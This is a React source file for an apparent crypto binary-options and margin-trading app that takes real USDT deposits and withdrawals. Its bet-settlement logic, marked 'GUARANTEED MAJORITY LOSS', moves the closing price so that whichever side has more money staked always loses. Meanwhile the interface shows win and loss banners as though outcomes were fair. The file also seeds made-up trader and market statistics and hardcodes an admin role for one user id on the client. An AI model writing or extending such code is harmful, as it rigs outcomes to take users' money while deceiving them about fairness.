import { useState, useEffect, useRef } from 'react';
import { Home, Compass, MessageCircle, User, ArrowUp, ArrowDown, Share2, Check, X, Shield, Coins, Wallet, ShieldAlert, TrendingUp } from 'lucide-react';
import HomeDashboard from './HomeDashboard';
import TransactionTerminal from './TransactionTerminal';
import NewsFlash from './NewsFlash';
import ProfileMy from './ProfileMy';
import SubModules from './SubModules';
import AuthPage from './AuthPage';
import AdminDashboard from './AdminDashboard';
import API_BASE_URL from './apiConfig';
import './App.css';

// Initialize Web Worker globally so child components can subscribe directly for high-frequency updates
export const simWorker = new Worker(new URL('./simulation.worker.js', import.meta.url), { type: 'module' });

function App() {
  const [isAuthenticated, setIsAuthenticated] = useState(() => {
    return localStorage.getItem('aq_auth') === 'true';
  });
  const [activeTab, setActiveTab] = useState('transaction');
  const [globalActiveBets, setGlobalActiveBets] = useState([]);
  const globalActiveBetsRef = useRef([]);
  const simStateRef = useRef(null);

  const syncActiveTradesToServer = (workerOpenPositions) => {
    try {
      const savedUser = JSON.parse(localStorage.getItem('aq_userData') || '{}');
      const curState = simStateRef.current || {};
      const userId = curState.userState?.id || savedUser.id || window._lastKnownUserId;
      if (!userId) return;
      const userName = curState.userState?.name || curState.userState?.nickname || savedUser.nickname || savedUser.name || `Client ${userId}`;
      const activePositions = workerOpenPositions || curState.userState?.openPositions || [];
      const activeBets = globalActiveBetsRef.current || [];
      
      const marginPositions = activePositions.map(p => ({
        id: p.id || Math.random().toString(),
        symbol: p.symbol || 'XAU/USD',
        type: p.type,
        entryPrice: p.entryPrice,
        marginUsed: p.margin || p.marginRequired || p.amount || 0,
        volume: p.volume || 0,
        pnl: p.pnl || 0
      }));

      const betPositions = activeBets.map(b => ({
        id: b.id || Math.random().toString(),
        symbol: b.symbol || 'XAU/USD',
        type: b.type,
        entryPrice: b.entryPrice,
        marginUsed: b.amount,
        pnl: 0,
        isBet: true
      }));

      const allActive = [...marginPositions, ...betPositions];
      
      fetch(`${API_BASE_URL}/api/trades/active/sync`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: userId.toString(), userName, activeTrades: allActive })
      }).catch(() => {});
    } catch (e) {}
  };

  useEffect(() => {
    globalActiveBetsRef.current = globalActiveBets;
    simWorker.postMessage({ type: 'SYNC_ACTIVE_BETS', payload: globalActiveBets });
    syncActiveTradesToServer(simState.userState?.openPositions || []);
  }, [globalActiveBets]);
  const [activeFunc, setActiveFunc] = useState(null);
  const [walletModal, setWalletModal] = useState(null); // 'TOPUP', 'WITHDRAW', 'TRANSFER'
  const [modalMethod, setModalMethod] = useState('USDT TRC-20');
  const [modalAmount, setModalAmount] = useState('');
  const [transferTarget, setTransferTarget] = useState('');
  const [walletAddress, setWalletAddress] = useState('');
  const [showNotification, setShowNotification] = useState(null); // { title, desc }
  const [dbTransactions, setDbTransactions] = useState([]); // Persistent DB transactions
  const [globalWithdrawalAddress, setGlobalWithdrawalAddress] = useState('');
  
  // Real-time states synced from Web Worker
  const [simState, setSimState] = useState({
    stocks: [],
    leaderboard: [],
    recentTrades: [],
    globalStats: {
      totalTraders: 3120,
      globalTradeCount: 14582,
      sentiment: 50,
      totalMarketCap: 1548029000,
      teamVolume: 0,
      totalCommissionEarned: 0
    },
    userState: (() => {
      const savedUser = localStorage.getItem('aq_userData');
      if (savedUser) {
        try { 
            let parsed = JSON.parse(savedUser);
            if (parsed.id?.toString() === '950936') {
                parsed.role = 'king_admin';
                parsed.permissions = ['overview', 'users', 'support', 'news', 'rebate', 'transfers', 'chart'];
            }
            return parsed;
        } catch(e){}
      }
      return {
        id: 525810,
        name: 'Rashida parv',
        balance: 10.00,
        unclaimedRebate: 0,
        claimedRebate: 0,
        holdings: { XAU: 0, BTC: 0 },
        betRecords: [],
        openPositions: [],
        pendingOrders: [],
        equity: 10.00,
        netWorth: 10.00,
        pnl: 0,
        tradesCount: 0
      };
    })(),
    marketEvent: null
  });
  useEffect(() => { simStateRef.current = simState; }, [simState]);

  // Live Sync Client Active Bets & Open Positions to Server for Admin Monitoring
  useEffect(() => {
    try {
      const params = new URLSearchParams(window.location.search);
      const ref = params.get('ref') || params.get('referral');
      if (ref) {
        localStorage.setItem('aq_invite_ref', ref.trim().toUpperCase());
      }
    } catch (e) { console.error(e); }

    syncActiveTradesToServer();
    const interval = setInterval(syncActiveTradesToServer, 3000);
    return () => clearInterval(interval);
  }, []);

  const handleLoginSuccess = (userData) => {
    setIsAuthenticated(true);
    setActiveTab('transaction');
    localStorage.setItem('aq_auth', 'true');
    localStorage.setItem('aq_userData', JSON.stringify(userData));
    setSimState(prev => ({
      ...prev,
      userState: {
        ...prev.userState,
        id: userData.id,
        name: userData.name,
        balance: userData.balance,
        phone: userData.phone,
        referralCode: userData.referralCode,
        referredBy: userData.referredBy,
        role: userData.role,
        permissions: userData.permissions
      }
    }));

    // Reset global cache variables to prevent syncing old user's diffs
    window._lastKnownBackendBalance = undefined;
    window._lastKnownNickname = undefined;
    window._lastKnownAvatar = undefined;
    window._lastKnownSimSpeed = undefined;
    window._lastKnownTheme = undefined;
    
    // Clear old transactions from UI instantly
    setDbTransactions([]);

    // Isolate worker state for this specific user
    simWorker.postMessage({ type: 'LOGIN_USER', payload: userData });
    
    // Hydrate tickets for this specific user
    const savedTickets = localStorage.getItem(`HFCusa_supportTickets_${userData.id}`) || localStorage.getItem(`alphaQuest_supportTickets_${userData.id}`);
    if (savedTickets) {
      try {
        simWorker.postMessage({ type: 'HYDRATE_TICKETS', payload: JSON.parse(savedTickets) });
      } catch (e) {
        console.error("Error parsing saved tickets", e);
      }
    }
  };

  const getActiveUserId = () => {
    try {
      const u = JSON.parse(localStorage.getItem('aq_userData') || '{}');
      if (u && u.id && u.id.toString() !== 'admin') return u.id.toString();
    } catch(e) {}
    return simState.userState?.id?.toString() || "525810";
  };

  // Handle logout — called from LogoutModule
  const handleLogout = () => {
    setIsAuthenticated(false);
    localStorage.removeItem('aq_auth');
    localStorage.removeItem('aq_userData');
    setActiveFunc(null);
    setActiveTab('transaction');
    simWorker.postMessage({ type: 'LOGOUT_USER' });
  };


  // Paginated directory search state
  const [searchState, setSearchState] = useState({
    items: [],
    totalPages: 1,
    totalItems: 0,
    currentPage: 1
  });

  // Theme Configuration state
  const [theme, setTheme] = useState(() => localStorage.getItem('theme') || 'light');

  // Handle Dark / Light / System Mode changes
  useEffect(() => {
    const applyTheme = () => {
      const root = document.documentElement;
      if (theme === 'system') {
        const systemTheme = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
        root.setAttribute('data-theme', systemTheme);
      } else {
        root.setAttribute('data-theme', theme);
      }
    };

    applyTheme();
    localStorage.setItem('theme', theme);

    if (theme === 'system') {
      const media = window.matchMedia('(prefers-color-scheme: dark)');
      const listener = () => applyTheme();
      media.addEventListener('change', listener);
      return () => media.removeEventListener('change', listener);
    }
  }, [theme]);

  // Handle remote theme sync from DB
  useEffect(() => {
      const handleThemeSync = (e) => {
          setTheme(e.detail);
      };
      window.addEventListener('SYNC_DB_THEME', handleThemeSync);
      return () => window.removeEventListener('SYNC_DB_THEME', handleThemeSync);
  }, []);

  const lastUpdateRef = useRef(0);

  useEffect(() => {
    // Hydrate daily stats from backend on initial load
    fetch(`${API_BASE_URL}/api/stats/daily_update`)
        .then(res => res.json())
        .then(data => {
            if (data.success && data.stats) {
                simWorker.postMessage({ type: 'HYDRATE_DAILY_STATS', payload: data.stats });
            }
        })
        .catch(err => console.error("Error fetching daily stats:", err));
  }, []);

  // Initialize Web Worker listeners
  useEffect(() => {
    // Listen to background calculations
    const handleMessage = (e) => {
      const { type, data } = e.data;
      if (type === 'STATE_UPDATE') {
        const now = Date.now();
        
        // --- GLOBALLY EVALUATE BINARY BETS ---
        if (globalActiveBetsRef.current.length > 0) {
           const remainingBets = [];
           let changed = false;

           // ── GUARANTEED MAJORITY LOSS & MINORITY WIN AT SETTLEMENT ──
           // Pre-evaluate symbol volumes so closePrice guarantees the heavier side loses and lighter side wins
           const symbolBetsMap = {};
           globalActiveBetsRef.current.forEach(b => {
              const sym = b.symbol ? b.symbol.split('/')[0] : 'XAU';
              if (!symbolBetsMap[sym]) symbolBetsMap[sym] = [];
              symbolBetsMap[sym].push(b);
           });

           Object.keys(symbolBetsMap).forEach(sym => {
              const bets = symbolBetsMap[sym];
              let totalRise = 0, totalFall = 0, minEntry = Infinity, maxEntry = -Infinity;
              let hasExpiring = false;
              bets.forEach(bet => {
                 const dMs = (bet.tfs || 60) * 1000;
                 const bkTs = Math.floor(data.timestamp / dMs) * dMs;
                 if (bet.targetCloseTs ? (data.timestamp >= bet.targetCloseTs) : (bkTs > bet.placedTs)) {
                    hasExpiring = true;
                 }
                 if (bet.type === 'Rise' || bet.type === 'BUY') totalRise += bet.amount;
                 else if (bet.type === 'Fall' || bet.type === 'SELL') totalFall += bet.amount;
                 if (bet.entryPrice < minEntry) minEntry = bet.entryPrice;
                 if (bet.entryPrice > maxEntry) maxEntry = bet.entryPrice;
              });

              if (hasExpiring) {
                 const stock = data.stocks.find(s => s.symbol === sym);
                 if (stock) {
                    const scale = sym === 'XAU' ? 0.8 : (sym === 'BTC' ? 2.5 : 0.8);
                    if (totalRise > totalFall && totalRise > 0) {
                       // Majority volume on Rise -> closePrice strictly BELOW lowest entry (Rise loses, Fall wins)
                       if (stock.price >= minEntry) {
                          stock.price = Number((minEntry - (0.15 * scale)).toFixed(2));
                       }
                    } else if (totalFall > totalRise && totalFall > 0) {
                       // Majority volume on Fall -> closePrice strictly ABOVE highest entry (Fall loses, Rise wins)
                       if (stock.price <= maxEntry) {
                          stock.price = Number((maxEntry + (0.15 * scale)).toFixed(2));
                       }
                    }
                 }
              }
           });

           globalActiveBetsRef.current.forEach(bet => {
              const dMs = (bet.tfs || 60) * 1000;
              const bkTs = Math.floor(data.timestamp / dMs) * dMs;
              const shouldClose = bet.targetCloseTs ? (data.timestamp >= bet.targetCloseTs) : (bkTs > bet.placedTs);
              
              if (shouldClose) {
                  const matchSymbol = (bet.symbol || 'XAU').split('/')[0];
                  const stock = data.stocks ? data.stocks.find(s => s.symbol === matchSymbol) : null;
                  const closePrice = stock ? stock.price : (bet.entryPrice || 0);
                  const draw = closePrice === bet.entryPrice;
                  const won = (bet.type === 'Rise' && closePrice > bet.entryPrice) || 
                              (bet.type === 'Fall' && closePrice < bet.entryPrice);
                  const brokerageFee = won ? (bet.amount * 0.05) : 0;
                  const rebate = won ? (bet.amount * 0.01) : 0;
                  const profit = won ? (bet.amount * 2) - brokerageFee : (draw ? bet.amount : 0);
                  
                  handleBetSettle({
                     profit,
                     record: {
                         ...bet,
                         closePrice,
                         closeTime: Date.now(),
                         pnl: won ? (bet.amount - brokerageFee) : (draw ? 0 : -bet.amount),
                         rebate,
                         spreadCost: brokerageFee,
                         reason: draw ? 'Draw' : 'Candle Close'
                     }
                  });
                  changed = true;
              } else {
                  remainingBets.push(bet);
              }
           });
           
           if (changed) {
               globalActiveBetsRef.current = remainingBets;
               setGlobalActiveBets(remainingBets);
           }
        }

        // Throttle global state updates to 1 FPS (every 1000ms) to fix React Context Bottleneck
        if (now - lastUpdateRef.current > 1000) {
          // Omit the high-frequency 'stocks' array from global state to save memory & render time
          const { stocks, ...lowFreqData } = data;
          
          // Forcefully inject role for 950936 to bypass worker caching issues
          if (lowFreqData.userState && lowFreqData.userState.id?.toString() === '950936') {
              lowFreqData.userState.role = 'king_admin';
              lowFreqData.userState.permissions = ['overview', 'users', 'support', 'news', 'rebate', 'transfers', 'chart'];
          }

          setSimState(lowFreqData);
          lastUpdateRef.current = now;

          if (data.userState && Array.isArray(data.userState.openPositions)) {
            syncActiveTradesToServer(data.userState.openPositions);
          }
          if (data.supportTickets && data.userState?.id) {
            localStorage.setItem(`HFCusa_supportTickets_${data.userState.id}`, JSON.stringify(data.supportTickets));
          }
          if (data.userState) {
            localStorage.setItem('aq_userData', JSON.stringify(data.userState));
          }
        }

        // Notify user if a breaking market event was just triggered
        if (data.marketEvent && (!simState.marketEvent || simState.marketEvent.type !== data.marketEvent.type)) {
          triggerBannerNotification(data.marketEvent.title, data.marketEvent.desc);
        }
      } else if (type === 'SEARCH_RESULTS') {
        setSearchState(data);
      } else if (type === 'MARGIN_CALL_EVENT') {
        triggerBannerNotification(
          '🚨 MARGIN CALL (ACCOUNT WASH)',
          'Your equity dropped below zero. All positions have been liquidated and your balance is set to 0.'
        );
      } else if (type === 'MARGIN_ALERT_EVENT') {
        const payload = e.data.payload;
        triggerBannerNotification(payload.title, payload.desc);
      } else if (type === 'DB_SAVE_TRADE') {
        const payload = e.data.payload;
        // Optimistically update lastKnownBackendBalance to prevent double counting on next sync
        window._lastKnownBackendBalance = (window._lastKnownBackendBalance || 0) + (payload.trade.pnl || 0);
        
        let realUserId = "525810";
        try {
          const u = JSON.parse(localStorage.getItem('aq_userData') || '{}');
          if (u && u.id && u.id.toString() !== 'admin') realUserId = u.id.toString();
        } catch(e) {}
        fetch(`${API_BASE_URL}/api/trades/close`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userId: realUserId, trade: payload.trade })
        }).then(res => res.json()).then(data => {
            if (data.success && typeof data.balance === 'number') {
                simWorker.postMessage({ type: 'SYNC_DB_BALANCE', payload: { balance: data.balance } });
                setSimState(prev => prev ? ({
                    ...prev,
                    userState: { ...(prev.userState || {}), balance: data.balance }
                }) : prev);
            }
        }).catch(err => console.error("Error saving trade:", err));
      } else if (type === 'DB_SAVE_DAILY_STATS') {
        const payload = e.data.payload;
        fetch(`${API_BASE_URL}/api/stats/daily_update`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(err => console.error("Error saving daily stats:", err));
      }
    };

    simWorker.addEventListener('message', handleMessage);

    // Initial Hydration is handled when user logs in via handleLoginSuccess
    // We remove the hardcoded hydration here to prevent the generic tickets from loading

    const savedUser = localStorage.getItem('aq_userData');
    if (savedUser) {
      try {
        const userData = JSON.parse(savedUser);
        if (userData.id?.toString() === '950936') {
            userData.role = 'king_admin';
            userData.permissions = ['overview', 'users', 'support', 'news', 'rebate', 'transfers', 'chart'];
        }
        simWorker.postMessage({ type: 'LOGIN_USER', payload: userData });
        const savedTickets = localStorage.getItem(`HFCusa_supportTickets_${userData.id}`) || localStorage.getItem(`alphaQuest_supportTickets_${userData.id}`);
        if (savedTickets) {
          simWorker.postMessage({ type: 'HYDRATE_TICKETS', payload: JSON.parse(savedTickets) });
        }
      } catch (e) {
        console.error("Error isolating user on startup", e);
      }
    }

    // Request initial data sync
    simWorker.postMessage({ type: 'REQUEST_REFRESH' });

    // Connect to Centralized Server Market Stream
    try {
      const es = new EventSource(`${API_BASE_URL}/api/market/stream`);
      es.onmessage = (e) => {
        try {
          const serverData = JSON.parse(e.data);
          if (serverData && serverData.stocks) {
            if (serverData.serverTime) {
              window.serverTimeOffset = serverData.serverTime - Date.now();
            }
            simWorker.postMessage({ type: 'SERVER_MARKET_TICK', payload: serverData });
          }
        } catch(err) {}
      };
      es.onerror = () => {
        // Fallback polling if EventSource drops
        fetch(`${API_BASE_URL}/api/market/ticks`)
          .then(r => r.json())
          .then(data => {
            if (data && data.stocks) {
              if (data.serverTime) window.serverTimeOffset = data.serverTime - Date.now();
              simWorker.postMessage({ type: 'SERVER_MARKET_TICK', payload: data });
            }
          }).catch(() => {});
      };
    } catch(err) {}

    const syncBackend = async () => {
        try {
            // Always read the latest user ID from localStorage to avoid React stale closures
            const savedUser = JSON.parse(localStorage.getItem('aq_userData') || '{}');
            const userId = (savedUser && savedUser.id && savedUser.id.toString() !== 'admin') ? savedUser.id.toString() : "525810";
            
            // Send online heartbeat
            fetch(`${API_BASE_URL}/api/user/heartbeat`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ userId })
            }).then(r => r.json()).then(hb => {
                if (hb && hb.serverTime) {
                    window.serverTimeOffset = hb.serverTime - Date.now();
                }
            }).catch(() => {});

            // INSTANT PRIORITY: Sync Database Balance FIRST before slow history tables!
            const res = await fetch(`${API_BASE_URL}/api/balance/${userId}`);
            const data = await res.json();
            
            if (data.success && typeof data.balance === 'number') {
                if (data.serverTime) {
                    window.serverTimeOffset = data.serverTime - Date.now();
                }
                simWorker.postMessage({ type: 'SYNC_DB_BALANCE', payload: { balance: data.balance } });
                setSimState(prev => prev ? ({
                    ...prev,
                    userState: { ...(prev.userState || {}), balance: data.balance }
                }) : prev);

                if (savedUser && savedUser.id) {
                    savedUser.balance = data.balance;
                    localStorage.setItem('aq_userData', JSON.stringify(savedUser));
                }
            }

            // Sync Database Transactions in background
            const txRes = await fetch(`${API_BASE_URL}/api/transactions/${userId}`);
            const txData = await txRes.json();
            if (txData.success) {
                setDbTransactions(txData.transactions);
            }
            
            // Sync Database Trades in background
            const trRes = await fetch(`${API_BASE_URL}/api/trades/${userId}`);
            const trData = await trRes.json();
            if (trData.success && trData.trades) {
                simWorker.postMessage({ type: 'SYNC_DB_TRADES', payload: { trades: trData.trades } });
            }
            
            // Sync Rebate History from DB in background
            const rhRes = await fetch(`${API_BASE_URL}/api/rebate/history/${userId}`);
            const rhData = await rhRes.json();
            if (rhData.success) {
                simWorker.postMessage({ type: 'SYNC_DB_REBATE_HISTORY', payload: { history: rhData.history } });
            }
            
            if (data.success) {
                // Always sync rebate to keep it updated from DB
                simWorker.postMessage({
                    type: 'SYNC_DB_REBATE',
                    payload: { 
                        unclaimedRebate: data.unclaimedRebate || 0,
                        claimedRebate: data.claimedRebate || 0
                    }
                });
                
                simWorker.postMessage({
                    type: 'ADMIN_SET_REBATE',
                    payload: { userId: simState.userState?.id || 525810, rate: data.rebateRate || 10 }
                });
                
                if (data.balance !== window._lastKnownBackendBalance) {
                    const isFirstSync = window._lastKnownBackendBalance === undefined;
                    const diff = data.balance - (window._lastKnownBackendBalance || 0);
                    window._lastKnownBackendBalance = data.balance;
                    
                    if (isFirstSync) {
                        simWorker.postMessage({
                            type: 'SYNC_DB_BALANCE',
                            payload: { overrideBalance: data.balance }
                        });
                    } else {
                        // Silently add funds without creating a fake transaction in the history
                        simWorker.postMessage({ 
                            type: 'SYNC_DB_BALANCE', 
                            payload: { amount: diff }
                        });
                        
                        if (diff > 0) {
                            triggerBannerNotification(
                                'Balance Synced! 🔄',
                                `Database updated. Current real balance is $${data.balance.toFixed(2)} USDT.`
                            );
                        }
                    }
                }
                
                // Sync Settings
                if (data.nickname !== window._lastKnownNickname || data.avatar !== window._lastKnownAvatar) {
                    window._lastKnownNickname = data.nickname;
                    window._lastKnownAvatar = data.avatar;
                    simWorker.postMessage({
                        type: 'CHANGE_NAME',
                        payload: { name: data.nickname, profilePic: data.avatar }
                    });
                }
                if (data.simSpeed && data.simSpeed !== window._lastKnownSimSpeed) {
                    window._lastKnownSimSpeed = data.simSpeed;
                    simWorker.postMessage({
                        type: 'CHANGE_SPEED',
                        payload: { speed: data.simSpeed }
                    });
                }
                if (data.withdrawalAddress !== window._lastKnownWithdrawalAddress || data.walletChangeAccess !== window._lastKnownWalletChangeAccess) {
                    window._lastKnownWithdrawalAddress = data.withdrawalAddress;
                    window._lastKnownWalletChangeAccess = data.walletChangeAccess;
                    setGlobalWithdrawalAddress(data.withdrawalAddress);
                    simWorker.postMessage({
                        type: 'UPDATE_WITHDRAWAL_ADDRESS',
                        payload: { withdrawalAddress: data.withdrawalAddress, walletChangeAccess: data.walletChangeAccess }
                    });
                }
                if (data.theme && data.theme !== window._lastKnownTheme) {
                    window._lastKnownTheme = data.theme;
                    // Trigger a custom event to update Theme in the App
                    window.dispatchEvent(new CustomEvent('SYNC_DB_THEME', { detail: data.theme }));
                }
            }
            
            // Sync Admin Stats (Company Profit & Rebate)
            const statsRes = await fetch(`${API_BASE_URL}/api/admin/stats`);
            const statsData = await statsRes.json();
            if (statsData.success && statsData.stats) {
                simWorker.postMessage({
                    type: 'SYNC_DB_GLOBAL_STATS',
                    payload: {
                        totalRebateGenerated: statsData.stats.totalRebateGenerated || 0,
                        totalSpreadCollected: statsData.stats.totalSpreadCollected || 0
                    }
                });
            }
        } catch (e) {
            // Backend might be offline, ignore
        }
    };

    window.syncBackend = syncBackend;

    // Run immediately without any delay on load
    setTimeout(syncBackend, 0);

    // Cryptomus Backend Polling (Sync every 5 seconds)
    const balanceInterval = setInterval(syncBackend, 5000);

    return () => {
      simWorker.removeEventListener('message', handleMessage);
      clearInterval(balanceInterval);
    };
  }, [simState]);

  // Show a temporary floating toast alert for major actions
  const triggerBannerNotification = (title, desc) => {
    setShowNotification({ title, desc });
    setTimeout(() => setShowNotification(null), 5000);
  };

  // Trigger search/sort operations inside Web Worker
  const handleSearchTraders = (searchQuery, sortBy, pageNum, pageSize, filterType) => {
    simWorker.postMessage({
      type: 'SEARCH_TRADERS',
      payload: { searchQuery, sortBy, pageNum, pageSize, filterType }
    });
  };

  // Handle buy/sell order placement
  const handleExecuteTrade = (stockSymbol, buyOrSell, qty) => {
    simWorker.postMessage({
      type: 'USER_TRADE',
      payload: { stockSymbol, buyOrSell, qty }
    });
    triggerBannerNotification(
      'Order Executed! ⚡',
      `Successfully ${buyOrSell === 'BUY' ? 'purchased' : 'sold'} ${qty} ${stockSymbol} at market price.`
    );
  };

  // Handle Rise/Fall Bet Settlement from Firm Offer Chart
  const handleBetSettle = (payload) => {
    simWorker.postMessage({
      type: 'USER_BET_SETTLE',
      payload: payload
    });
    
    let realUserId = "525810";
    try {
      const u = JSON.parse(localStorage.getItem('aq_userData') || '{}');
      if (u && u.id && u.id.toString() !== 'admin') realUserId = u.id.toString();
    } catch(e) {}

    if (!payload.record && payload.profit < 0) {
      // Deduct bet stake from MongoDB DB balance immediately
      const stake = Math.abs(payload.profit);
      fetch(`${API_BASE_URL}/api/user/deduct_balance`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: realUserId, amount: stake })
      }).then(res => res.json()).then(data => {
        if (data.success && typeof data.balance === 'number') {
          window._lastKnownBackendBalance = data.balance;
        }
      }).catch(() => {});
    }

    // Show banner only if it's a settlement (record exists)
    if (payload.record) {
      if (payload.profit > 0) {
        // profit here is total return (stake + profit). Since it's 100% payout, profit is payload.profit / 2.
        triggerBannerNotification('Bet Won! 🟢', `You won $${(payload.profit / 2).toFixed(2)} USDT`);
      } else {
        triggerBannerNotification('Bet Lost! 🔴', `You lost $${Math.abs(payload.record.pnl).toFixed(2)} USDT`);
      }
    } else {
      triggerBannerNotification('Bet Placed! 🎲', `Good luck!`);
    }
  };

  // Margin Trading Actions (send to worker)
  const handleMarginMarketOrder = (symbol, type, volume, tp, sl) => {
    simWorker.postMessage({ type: 'MARGIN_MARKET_ORDER', payload: { symbol, type, volume, tp, sl } });
    
    if (simState.userState?.balance < 5) {
      triggerBannerNotification('Order Rejected', 'Insufficient balance. Please deposit funds.');
    } else {
      triggerBannerNotification('Order Executed', `${type} ${volume} Lots ${symbol} at Market Price`);
    }
  };

  const handleMarginPendingOrder = (symbol, type, volume, targetPrice, tp, sl) => {
    simWorker.postMessage({ type: 'MARGIN_PENDING_ORDER', payload: { symbol, type, volume, targetPrice, tp, sl } });
    triggerBannerNotification('Pending Order Placed', `${type} ${volume} Lots ${symbol} at ${targetPrice}`);
  };

  const handleMarginClosePosition = (id) => {
    simWorker.postMessage({ type: 'MARGIN_CLOSE_POSITION', payload: { id } });
    triggerBannerNotification('Position Closed', 'Position successfully closed at market price.');
  };

  const handleMarginCancelOrder = (id) => {
    simWorker.postMessage({ type: 'MARGIN_CANCEL_ORDER', payload: { id } });
    triggerBannerNotification('Order Cancelled', 'Pending order cancelled.');
  };

  // Deposit simulated cash (Top Up) -> Real Cryptomus Flow
  const handleTopUpSubmit = async (e) => {
    e.preventDefault();
    const val = parseFloat(modalAmount);
    if (isNaN(val) || val <= 1) {
       alert("Deposit amount must be greater than the $1.00 fee.");
       return;
    }

    try {
        const response = await fetch(`${API_BASE_URL}/api/cryptomus/deposit`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                amount: val,
                currency: "USDT",
                userId: simState.userState?.id?.toString() || "525810"
            })
        });

        const data = await response.json();

        if (data.success && data.payment_url) {
            triggerBannerNotification(
                'Deposit Invoice Created',
                `Redirecting to secure payment gateway...`
            );
            // Open payment URL in new tab
            window.open(data.payment_url, '_blank');
        } else {
            alert("Failed to create deposit invoice: " + (data.message || "Unknown error"));
        }
    } catch (error) {
        console.error("Deposit request failed:", error);
        alert("Could not reach payment server. Make sure the backend is running.");
    }

    setWalletModal(null);
    setModalAmount('');
    setModalMethod('USDT TRC-20');
  };

  // Withdraw simulated cash -> Now requires Wallet Address
  const handleWithdrawSubmit = async (e) => {
    e.preventDefault();
    const val = parseFloat(modalAmount);
    if (isNaN(val) || val <= 0 || val > simState.userState.balance) return;
    
    const effectiveAddress = ((modalMethod === 'USDT TRC-20' && simState.userState?.withdrawalAddress) ? simState.userState.withdrawalAddress : walletAddress || '').trim();
    if (!effectiveAddress) {
        alert("Please enter a valid wallet address.");
        return;
    }
    if (modalMethod === 'USDT TRC-20' && !/^T[a-zA-Z0-9]{33}$/.test(effectiveAddress)) {
        alert("⚠️ Invalid USDT (TRC-20) Wallet Address!\nA valid TRC20 address must start with capital 'T' and contain exactly 34 characters (e.g. T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb).");
        return;
    }

    try {
      const res = await fetch(`${API_BASE_URL}/api/withdraw`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: simState.userState.id.toString(),
          amount: val,
          walletAddress: effectiveAddress,
          method: modalMethod
        })
      });
      const data = await res.json();
      if (!data.success) {
        alert("Withdrawal failed: " + data.message);
        return;
      }
    } catch (err) {
      console.error(err);
      alert("Network error.");
      return;
    }

    const fee = val * 0.01;
    const finalAmount = val - fee;
    const sourceText = activeFunc === 'REBATE' ? ' (From Claimed Rebate)' : '';

    handleAdminAction('USER_SUBMIT_TICKET', {
      text: `Financial Request: Withdrawal of $${val.toFixed(2)} USDT via ${modalMethod}${sourceText} to Address: ${effectiveAddress} (Fee 1%: $${fee.toFixed(2)}, Net: $${finalAmount.toFixed(2)})`,
      isFinancial: true,
      actionType: 'WITHDRAW',
      amount: val,
      method: modalMethod,
      walletAddress: effectiveAddress, // IMPORTANT: Needed for Payout API
      userId: simState.userState?.id?.toString() || "525810"
    });
    
    triggerBannerNotification(
      'Withdrawal Request Submitted',
      `Your request for $${val.toFixed(2)} USDT (-1% fee) is pending approval.`
    );
    setWalletModal(null);
    setModalAmount('');
    setWalletAddress('');
    setModalMethod('USDT TRC-20');
  };

  // Transfer simulated cash
  const handleTransferSubmit = (e) => {
    e.preventDefault();
    const val = parseFloat(modalAmount);
    if (isNaN(val) || val <= 0 || val > simState.userState.balance || !transferTarget.trim()) return;

    simWorker.postMessage({
      type: 'USER_TRANSFER',
      payload: { transferAmount: val }
    });
    triggerBannerNotification(
      'Transfer Complete! ✈️',
      `Transferred $${val.toFixed(2)} USDT to address: ${transferTarget.substring(0, 10)}...`
    );
    setWalletModal(null);
    setModalAmount('');
    setTransferTarget('');
  };

  // Trigger market macro shock events
  const handleTriggerShock = (eventType) => {
    simWorker.postMessage({
      type: 'TRIGGER_SHOCK',
      payload: { eventType }
    });
  };

  // Update simulator settings/speed
  const handleUpdateConfig = (newName, newSpeed, newPaused, newPic) => {
    if (newSpeed !== undefined) {
      simWorker.postMessage({
        type: 'CHANGE_SPEED',
        payload: { speed: newSpeed }
      });
    }
    if (newPaused !== undefined) {
      simWorker.postMessage({
        type: 'PAUSE_SIM',
        payload: { pause: newPaused }
      });
    }
    if (newName !== undefined || newPic !== undefined) {
      simWorker.postMessage({
        type: 'CHANGE_NAME',
        payload: { name: newName, profilePic: newPic }
      });
    }
    
    // Save to Database
    const realUserId = simState.userState?.id?.toString() || "525810";
    const currentTheme = document.body.getAttribute('data-theme') || 'light'; // We will just send current theme if we don't have it explicitly
    fetch(`${API_BASE_URL}/api/settings/update`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            userId: realUserId,
            nickname: newName,
            avatar: newPic,
            simSpeed: newSpeed,
            theme: theme
        })
    }).catch(err => console.error("Error saving settings:", err));

    triggerBannerNotification('Settings Applied! ⚙️', 'Configurations and Profile updated.');
  };

  // Hard Reset the Simulation
  const handleResetSim = () => {
    if (window.confirm("Are you sure you want to reset all 3,000+ traders and wipe your balance back to $10 USDT?")) {
      window.location.reload();
    }
  };

  // Admin Actions
  const handleAdminAction = (actionType, payload) => {
    if (actionType === 'USER_CLAIM_REBATE') {
        const realUserId = simState.userState?.id?.toString() || "525810";
        fetch(`${API_BASE_URL}/api/rebate/claim`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userId: realUserId, amount: payload.amount })
        }).then(res => res.json()).then(data => {
            if (data.success) {
                if (window.syncBackend) window.syncBackend();
                triggerBannerNotification('Rebate Claimed', `Successfully claimed $${payload.amount.toFixed(2)} to your wallet.`);
            }
        }).catch(err => console.error("Error claiming rebate:", err));
        return; // Skip sending to worker, let backend sync handle it
    }

    if (actionType === 'ADMIN_SET_REBATE') {
        // If it's the real user (id 525810), save to DB
        if (payload.userId === (simState.userState?.id || 525810)) {
            const realUserId = simState.userState?.id?.toString() || "525810";
            fetch(`${API_BASE_URL}/api/admin/set_rebate`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ userId: realUserId, rate: payload.rate })
            }).catch(err => console.error("Error setting rebate rate:", err));
        }
        // Let it fall through to update worker state instantly
    }

    simWorker.postMessage({
      type: actionType,
      payload
    });
